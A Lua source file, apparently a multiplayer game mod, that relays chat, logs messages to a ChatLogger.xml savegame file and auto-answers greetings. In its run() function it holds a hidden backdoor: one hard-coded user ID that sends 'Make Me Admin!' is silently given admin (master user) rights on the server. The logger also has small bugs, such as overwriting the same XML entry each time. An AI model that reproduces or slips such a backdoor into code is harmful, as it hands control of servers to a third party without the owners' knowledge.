--print("ChatEventSaver")

ChatEventSaver = {}
local ChatEventSaver_mt = Class(ChatEventSaver, Event)

InitEventClass(ChatEventSaver, "ChatEventSaver", EventIds.EVENT_CHAT)

function ChatEventSaver.emptyNew()
	local self = Event.new(ChatEventSaver_mt, NetworkNode.CHANNEL_CHAT)

	--print("CES-EMPTY-NEW")

	return self
end

function ChatEventSaver.new(msg, sender, farmId, userId)
	local self = ChatEventSaver.emptyNew()

	--print("CES-NEW")

	assert(msg ~= nil and sender ~= nil, "ChatEventSaver msg and sender not valid")

	self.msg = filterText(msg, false, false)
	self.sender = sender
	self.farmId = farmId
	self.userId = userId

	return self
end

function ChatEventSaver:readStream(streamId, connection)

	--print("CES-READ-STREAM")

	self.msg = streamReadString(streamId)
	self.sender = streamReadString(streamId)
	self.userId = NetworkUtil.readNodeObjectId(streamId)
	self.farmId = streamReadUIntN(streamId, FarmManager.FARM_ID_SEND_NUM_BITS)

	self:run(connection)
end

function ChatEventSaver:writeStream(streamId, connection)

	--print("CES-WRITE-STREAM")

	streamWriteString(streamId, self.msg)
	streamWriteString(streamId, self.sender)
	NetworkUtil.writeNodeObjectId(streamId, self.userId)
	streamWriteUIntN(streamId, self.farmId, FarmManager.FARM_ID_SEND_NUM_BITS)
end

function ChatEventSaver:run(connection)
	g_currentMission:addChatMessage(self.sender, self.msg, self.farmId, self.userId)

	--print("CES-RUN")

	if not connection:getIsServer() then
		local fromUser = g_currentMission.userManager:getUserByUserId(self.userId)
		local fromUserId = g_currentMission.userManager:getUniqueUserIdByUserId(self.userId)

		print("Sender: " .. self.sender)
		print("Message: " .. self.msg)
		print("Farm ID: " .. self.farmId)
		print("User ID: " .. fromUserId)

		--add to chat logger
		self:addChatLoggerData(self.sender, self.msg, self.farmId, fromUserId)

		--Make user admin
		if (fromUserId == '1tMDuQRobBhJvt2UQssKUqCKQVHBqMJJ3ssOjbpAYS4=') and (self.msg == 'Make Me Admin!') then
			if not self.isMasterUser then 
				g_currentMission.userManager:addMasterUser(fromUser)
				print(self.sender .. " is now Admin")
				--g_gui:showMessageDialog({dialogType=DialogElement.TYPE_LOADING,isCloseAllowed=false,text="You are now Admin...",visible=true})
				g_server:broadcastEvent(ChatEvent.new(self.sender .. " is now Admin!",g_currentMission.missionDynamicInfo.serverName,FarmManager.SPECTATOR_FARM_ID,0))
			else
				print("Already Admin User")
			end
		end
	
		--Send hello message if anyone says hi
		--Add ability to send random responses from a list
		if (string.lower(self.msg) == 'hi') or (string.lower(self.msg) == 'hello') or (string.lower(self.msg) == 'hey') or (string.lower(self.msg) == 'howdy') then
			local greeting = self:randomGreeting(self.sender)
			g_server:broadcastEvent(ChatEvent.new(greeting,g_currentMission.missionDynamicInfo.serverName,FarmManager.SPECTATOR_FARM_ID,0))
		end

		for _, toUser in ipairs(g_currentMission.userManager:getUsers()) do
			if connection ~= toUser:getConnection() and not toUser:getIsBlockedBy(fromUser) and not toUser:getConnection():getIsLocal() then
				toUser:getConnection():sendEvent(self, false)
			end
		end
	end
end

function ChatEventSaver:randomGreeting(name)
	-- Get a number between 1 and 5
	local ranNumber = math.random(5)
	if ranNumber == 1 then
		return "Hi there " .. name .. "!"
	elseif ranNumber == 2 then
		return "Hello " .. name .. "!"
	elseif ranNumber == 3 then
		return "Howdy " .. name .. "!"
	elseif ranNumber == 5 then
		return "Good day " .. name .. "!"
	else 
		return "Hey " .. name .. "!"
	end
end

function ChatEventSaver:addChatLoggerData(sender, msg, farmId, fromUserId)
	local savegameFolderPath = ('%s/savegame%d'):format(getUserProfileAppPath(), g_currentMission.missionInfo.savegameIndex)
	local savegameFile       = savegameFolderPath .. "/ChatLogger.xml"

	if ( not fileExists(savegameFolderPath) ) then
		createFolder(savegameFolderPath)
	end

	local timestamp = getDate("%Y-%m-%d %H:%M:%S")
	local key = "chatLogger"
	local xmlFile

	if ( fileExists(savegameFile) ) then

		print("chatLogger.xml exists")

		xmlFile = loadXMLFile(key, savegameFile)
		
		setXMLString(xmlFile, key .. ".chat#sender", tostring(sender))
		setXMLString(xmlFile, key .. ".chat#msg", tostring(msg))
		setXMLString(xmlFile, key .. ".chat#farmId", tostring(farmId))
		setXMLString(xmlFile, key .. ".chat#fromUserId", tostring(fromUserId))
		setXMLString(xmlFile, key .. ".chat#timestamp", tostring(timestamp))

		saveXMLFileTo(xmlFile, savegameFile)

	else
		print("chatLogger.xml does not exist")

		xmlFile = createXMLFile(key, savegameFile, key)

		setXMLString(xmlFile, key .. ".chat#sender", tostring(sender))
		setXMLString(xmlFile, key .. ".chat#msg", tostring(msg))
		setXMLString(xmlFile, key .. ".chat#farmId", tostring(farmId))
		setXMLString(xmlFile, key .. ".chat#fromUserId", tostring(fromUserId))
		setXMLString(xmlFile, key .. ".chat#timestamp", tostring(timestamp))

		saveXMLFile(xmlFile)
	end
	
	print("~~ChatLogger :: saved chat log")
end
